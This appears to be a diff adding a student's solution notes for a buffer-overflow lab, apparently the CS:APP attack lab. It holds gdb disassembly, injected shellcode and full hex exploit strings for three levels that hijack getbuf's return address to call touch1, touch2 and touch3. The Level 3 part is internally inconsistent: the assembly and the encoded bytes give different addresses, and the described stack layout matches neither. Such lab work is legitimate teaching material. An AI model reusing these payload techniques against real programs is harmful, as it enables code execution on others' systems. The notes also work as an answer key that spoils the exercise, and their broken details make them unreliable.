@@ -1,0 +1,109 @@
+=========== LEVEL 1 ===========
+1. gdb ctarget => disas getbuf, we have:
+
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:    sub    $0x28,%rsp
+=> 0x00000000004017ac <+4>:    mov    %rsp,%rdi
+   0x00000000004017af <+7>:    callq  0x401a40 <Gets>
+   0x00000000004017b4 <+12>:    mov    $0x1,%eax
+   0x00000000004017b9 <+17>:    add    $0x28,%rsp
+   0x00000000004017bd <+21>:    retq
+End of assembler dump.
+
+we can see that our buf size is 0x28, which is 40 bytes in decimal,
+thereform, we only need to enter 40 bytes, plus the address of our exploit code, so that 
+we can overwrite the original return address of the caller function of getbuf.
+
+2. we want to call function 'touch1': disas touch1, we have:
+
+Dump of assembler code for function touch1:
+   0x00000000004017c0 <+0>:    sub    $0x8,%rsp
+
+so we know the first line of touch1 is in *0x00000000004017c0
+thus, we should enter:
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff  # 40 bytes of random input
+c0 17 40 00 00 00 00 00  # overwrite return address (note: use little-endian)
+
+=========== LEVEL 2 ===========
+for level2, besides calling touch function, we also want to pass an argument.
+so in our exploit code, we want to set the register %rdi to the argument we want.
+
+idea:
+* plant our code at the beginning of the buf (so we know that address)
+* overwrite the return address of the caller of getbuf to the address above
+
+1. write the assembly code:
+
+————————————————
+movq $0x59b997fa, %rdi    # move cookie into the register as the argument
+pushq $0x004017ec         # start address of touch2
+retq		          # pop stack, go to touch2
+————————————————
+
+then dissemble:
+
+————————————————
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 ec 17 40 00          pushq  $0x4017ec
+   c:   c3                      retq   
+————————————————
+
+2. find the address of the beginning of the buf,
+which is 0x5561dc78
+
+
+3. thus, we should enter:
+
+48 c7 c7 fa 97 b9 59 68 # expoit code
+ec 17 40 00 c3 ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 dc 61 55 00 00 00 00 # overwrite return address to the begining of the buf
+
+=========== LEVEL 3 ===========
+For this one, we want to pass the address of the cookie string as an argument into 'touch3', but
+'touch3' calls another function 'hexmatch' that will possibly overwrite the memory where we store 
+the cookie string.
+
+So, we want to store the cookie string in places in stack where the hexmatch can't reach
+In particular,
+
+exploit code + random stuff| return address overwrite|        cookie string     |
+0                        40|41                     48|49                      56|
+
+assembly code:
+————————————————
+movq $0x5561dca0,%rdi # move the cookie string address into %rdi
+pushq $0x004018fa     # beginning address of touch3
+retq
+————————————————
+
+dissembly:
+
+————————————————
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:    48 c7 c7 98 dc 61 55     mov    $0x5561dca0,%rdi
+   7:    68 fa 18 40 00           pushq  $0x4018fa
+   c:    c3 
+————————————————
+
+thus, we should enter:
+
+48 c7 c7 98 dc 61 55 68 # exploit code
+fa 18 40 00 c3 ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 dc 61 55 00 00 00 00 # overwrite return address to the start of buff
+35 39 62 39 39 37 66 61 # cookie string
+
